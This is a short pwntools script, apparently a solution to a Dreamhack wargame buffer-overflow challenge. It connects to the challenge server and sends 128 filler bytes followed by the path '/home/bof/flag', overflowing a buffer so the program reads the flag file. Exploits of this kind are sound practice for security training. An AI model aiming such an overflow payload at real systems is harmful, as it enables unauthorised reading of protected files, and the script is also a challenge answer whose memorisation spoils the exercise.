from pwn import *

p=remote("host3.dreamhack.games",24290)

p.sendline(b'A'*128+b"/home/bof/flag")

p.interactive()